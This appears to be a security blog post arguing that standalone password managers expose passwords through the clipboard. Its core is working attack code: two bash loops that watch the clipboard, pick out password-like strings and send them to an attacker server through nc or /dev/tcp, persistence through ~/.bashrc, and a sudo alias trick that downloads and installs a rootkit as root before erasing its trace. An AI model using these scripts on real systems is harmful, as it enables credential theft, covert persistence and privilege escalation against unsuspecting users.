# The Problem
I have a ton of paranoid friends that need passwords so strong they can't even remember them. They don't use long sentences or just humanly complex passwords, no. They use software that reads from `/dev/urandom` and generates some __16 to 32 characters long completely random alphanumeric strings__.

I have personally no problem with other people paranoias, unless it can cause harm or it is incoherent, and this can easily become both.

Since they know that exposing their passwords database to more attacks than needed is not a good idea, they usually avoid browser's plugins.

They just have the password manager as a standalone program  and this is *__BAD__*

Not
```
 ____    _    ____  
| __ )  / \  |  _ \ 
|  _ \ / _ \ | | | |
| |_) / ___ \| |_| |
|____/_/   \_\____/ 
```
but *__BAD__* indeed.

# The reasons
Having a browser plugin would mean being exposed to the risk of some very evil webpage that can escape the sandbox and read the plugin's memory.

Keylogging you while you type your master password would require high privileges on your machine, and if an attacker can keylog you you are screwed anyway.

The standalone password manager looks like a solution that prevents any non-root application from having you passwords. No malicious plugin or webpage can access the application's memory which is protected by the kernel, so you are safe.

Which is wrong.

If the attacker can compromise your browser and run code with your user's privileges, you are exposed to the same risk.

Why?

Because no one has the time to manually type 32 characters long passwords, and if I can get my code running on your machine, you can be *sure* the one thing I will read is the clipboard. If I can't get root privileges and I can't monitor you keyboard I can for sure always read your clipboard.

I will not talk about windows because it is so easy to [read other applications' memory](https://msdn.microsoft.com/en-us/library/ms680553%28VS.85%29.aspx) with normal user privileges that reading the clipboard becomes purposeless.

# The code
Assumptions:
 1. I broke in some way into your system and I can write to a file (i.e. I broke out of the browser's sandbox or found a way to make you open some app or script I have control on.)
 1. Your passwords are safely Stored into your password manager
 1. You are lazy
 1. You are a nerd

Writing to a file in *NIX systems equals running some code at some point thanks to (4): just append your command to ~/.bashrc or ~/.zshrc and wait for the user to open the terminal.

So, we have some code running on a system we know barely anything about and with just user privileges. Let's steal your passwords.

This is more cross platform but requires `nc`
```sh
#TODO test on macosx
lastpass=""
[[ "$(uname -s)" =~ Linux ]] && pbpaste(){ xclip -selection clipboard -o ; }
while :
do
	clipboard="$(pbpaste)"
	[[ "$clipboard" != "$lastpass" ]] &&
		[[ "$clipboard" =~ $REGEXTHATMATCHESPASSWORD ]] &&
			echo -n "$clipboard" | nc -c $evilserver &&
				lastpass="$clipboard"
	sleep 1
done
```

This only works on linux and only on bash, but does not depend on `netcat`, which can be quite unreliable [¹](https://serverfault.com/questions/512722/automatically-close-netcat-connection) [²](https://superuser.com/questions/691008/why-is-the-e-option-missing-from-netcat-openbsd) [³](https://unix.stackexchange.com/questions/193579/nc-commands-k-option)
```sh
#! /bin/env bash
evilserver="localhost/5555"
lastpass=""
while :
do
	clipboard="$(xclip -selection clipboard -o)"
	[[ "$clipboard" != "$lastpass" ]] &&
		[[ "$clipboard" =~ ^REGEXTHATMATCHESPASSWORD$ ]] &&
			echo -n "$clipboard" > "/dev/tcp/$evilserver" &&
				lastpass="$clipboard"
	sleep 1
done

```
`REGEXTHATMATCHESPASSWORD` will probably be something that looks like this: `^[A-Za-z0-9]{16}$`

And

`evilserver` is going to be `1.3.3.7/1337` in the first case and `1.3.3.7 1337` in the last one.

# Conclusion

Well, I could get your passwords when I normally wouldn't if you hadn't a password manager.

One can probably object that having your browser compromised and your passwords stolen from a plugin is more likely than having someone else's code running on your machine, but if you are a developer or a common nerd, I am pretty sure you have some unsigned code running on your machine that you didn't inspect.

# Alternative Conclusion AKA Privilege escalation is not that hard

If you can write to the `.(ba|z)shrc` file, there is a funnier trick you can do:

```sh
wget 'evlisite/rootkit' -O $SOMEFOLDER/.rootkit

echo 'alias sudo="chmod +x $SOMEFOLDER/.rootkit && sudo $SOMEFOLDER/.rootkit --install && rm $SOMEFOLDER/.rootkit && truncate .bashrc -s -$(tail -n 1 .bashrc | wc -c) ; sudo"' >> ~/.bashrc
```

In this way the first time the user uses `sudo somecommand` she will be prompted for her password once and she will see her command run as root. What she will not know is that the rootkit has been installed and the .bashrc file restored to its original content.
